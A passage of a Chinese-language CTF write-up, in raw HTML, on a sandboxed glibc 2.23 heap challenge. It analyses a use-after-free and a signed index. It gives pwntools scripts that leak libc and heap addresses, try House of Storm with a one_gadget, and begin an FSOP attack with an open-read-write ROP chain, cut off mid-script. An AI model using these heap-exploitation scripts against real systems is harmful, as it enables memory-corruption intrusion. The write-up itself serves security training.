class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;which chunk you want to delete?&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index error.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( chunk_list[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[index]);            <span class="comment">// UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;delete success.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>申请模块：UAF漏洞，但这也意味着我们只能申请8个chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF 似乎可以溢出</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( edit_chance )                            <span class="comment">// 只能修改两次</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;which chunk you want to edit?&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">    <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">7</span> )               <span class="comment">// 限制index</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;index error.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( chunk_list[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (<span class="keyword">void</span> *)chunk_list[index], size_list[index]);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;edit success.&quot;</span>);</span><br><span class="line">      --edit_chance;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can only edit twice.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改模块：index 采用“int”类型，可以为负数（同时用整数溢出逃避检查）</p>
<p><strong>入侵思路</strong></p>
<p>程序限制点：</p>
<ul>
<li>程序开了沙盒（掐掉了 execve），那么就只能打 ORW </li>
<li>申请模块限制了“size”大小，只能申请 largechunk</li>
<li>申请模块只能执行8次</li>
<li>修改模块和释放模块都只能执行2次</li>
</ul>
<p>因为有UAF，所以 leak libc_base 很好办：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr<span class="number">-0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<p>接下来试试看 House Of Storm（这里我重新调整了一下 leak 的代码）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0(unsorted)</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#2(large)</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">3952488</span></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4(unsorted)</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x564cc7b72540</span> —▸ <span class="number">0x7f2f65fd4b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x564cc7b72540</span></span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x564cc7b72da0</span> —▸ <span class="number">0x7f2f65fd4f68</span> (main_arena+<span class="number">1096</span>) ◂— <span class="number">0x564cc7b72da0</span></span><br></pre></td></tr></table></figure>
<p>接下来就要进行修改：</p>
<ul>
<li>unsorted_chunk-&gt;BK =&gt; fake_chunk</li>
<li>large_chunk-&gt;BK =&gt; fake_chunk+8</li>
<li>large_chunk-&gt;BK_nextsize =&gt; fake_chunk-0x18-5</li>
</ul>
<p>刚好用完程序的两次修改机会：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main_arena1=libc_base+<span class="number">3951480</span></span><br><span class="line">main_arena2=libc_base+<span class="number">3952488</span></span><br><span class="line">payload1=p64(main_arena1)+p64(free_hook)</span><br><span class="line">payload2=p64(main_arena2)+p64(free_hook+<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x18</span><span class="number">-5</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload1)</span><br><span class="line">edit(<span class="number">2</span>,payload2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,one_gadget)</span><br></pre></td></tr></table></figure>
<p>这里我其实想偷懒，试试看不伪造 large_chunk-&gt;FD_nextsize 可不可行，结果报错了，只好老老实实泄露 heap_base 了</p>
<p>完成攻击后还是报错了（想不明白为什么），先挂一下 House Of Storm 的代码，以后熟悉 House Of Storm 了再慢慢看：（这个题目是开了沙盒的，所以用“one_gadget”肯定不行，但我这里懒得改了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span> <span class="comment"># 0x410 ~ 0xa9be</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to delete?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to edit?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to show?\n&#x27;</span>,<span class="built_in">str</span>(index))	</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0(unsorted)</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#2(large)</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">3952488</span></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget_list=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">2</span>]+libc_base</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=leak_addr-<span class="number">3488</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4(unsorted)</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">main_arena1=libc_base+<span class="number">3951480</span></span><br><span class="line">main_arena2=libc_base+<span class="number">3952488</span></span><br><span class="line">heap_addr=heap_base+<span class="number">3488</span></span><br><span class="line">payload1=p64(main_arena1)+p64(malloc_hook)</span><br><span class="line">payload2=p64(main_arena2)+p64(malloc_hook+<span class="number">8</span>)+p64(heap_addr)+p64(malloc_hook-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload1)</span><br><span class="line">edit(<span class="number">2</span>,payload2)</span><br><span class="line">add(<span class="number">0x410</span>,one_gadget)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>学长说这个题要用  FSOP 来打，刚好前几天整理的 IO pwn 中就有 FSOP，当时还没有进行题目练习，可以用这个题来练练手</p>
<p>以下代码就是我的第一次尝试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span> <span class="comment"># 0x410 ~ 0xa9be</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to delete?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to edit?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to show?\n&#x27;</span>,<span class="built_in">str</span>(index))	</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x6b0</span>,<span class="string">&#x27;hehehehe&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;./flag\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">3952488</span></span><br><span class="line">system_libc=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">one_gadget_list=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">2</span>]+libc_base</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&#x27;io_list_all &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=leak_addr-<span class="number">1344</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x000000000003a738</span></span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x0000000000021112</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">syscall_ret=libc_base+<span class="number">0x00000000000bc3f5</span></span><br><span class="line"></span><br><span class="line">bss_addr=heap_base+<span class="number">0x18</span></span><br><span class="line">flag_addr=heap_base+<span class="number">3088</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(flag_addr,0)</span></span><br><span class="line">orw =  p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) </span><br><span 